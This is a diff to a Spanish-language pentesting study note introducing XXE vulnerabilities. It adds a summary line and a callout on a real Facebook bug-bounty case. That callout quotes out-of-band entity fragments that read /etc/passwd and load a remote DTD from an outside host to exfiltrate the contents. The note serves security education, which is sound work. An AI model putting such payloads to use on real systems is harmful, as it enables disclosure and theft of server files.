@@ -3,6 +3,8 @@ tags:
   - Web/Red-Team
   - Pentesting/Explotacion
   - XXE
+  - Tipo/Introduccion
+Descripción: "Una vulnerabilidad XXE (XML External Entity) ocurre cuando una app procesa datos XML controlados por el usuario sin sanearlos ni parsearlos de forma segura, permitiéndonos…"
 Fecha de actualización: 2026-07-15
 Nota previa: "[[13 - Herramientas para IDOR]]"
 Nota siguiente: "[[15 - Divulgación de archivos locales]]"
@@ -11,6 +13,9 @@ Area: "[[Web Attacks.base|Web Attacks]]"
 ---
 
 <mark style="background: #ADCCFFA6;">Una vulnerabilidad `XXE` (XML External Entity) ocurre cuando una app procesa datos `XML` controlados por el usuario sin sanearlos ni parsearlos de forma segura</mark>, permitiéndonos abusar de características del propio XML. El impacto va desde <mark style="background: #FFB86CA6;">leer ficheros sensibles del servidor hasta `SSRF`, robo de credenciales y `RCE`</mark>, o tumbar el servidor por `DoS`. Está en el OWASP Top 10.
+
+> [!example]+ Caso real — Facebook XXE con Word · $6.300
+> Mohamed Ramadan subió un `.docx` (que por dentro es un ZIP de XMLs) a la página de empleo de Facebook, con un payload OOB de *parameter entities*: un `<!ENTITY % file SYSTEM "file:///etc/passwd">` más un `<!ENTITY % dtd SYSTEM "http://IP/ext.dtd">` remoto que definía el callback de exfiltración. Los logs de su propio servidor confirmaron que Facebook **resolvió la DTD externa**. **Lección**: prueba XXE en **todo** formato basado en XML (`.docx`, `.xlsx`, `.pptx`, `.svg`), no solo XML crudo; y si rechazan el reporte por "no reproducible", insiste con la evidencia de tus logs.
 
 # XML en 60 segundos
 
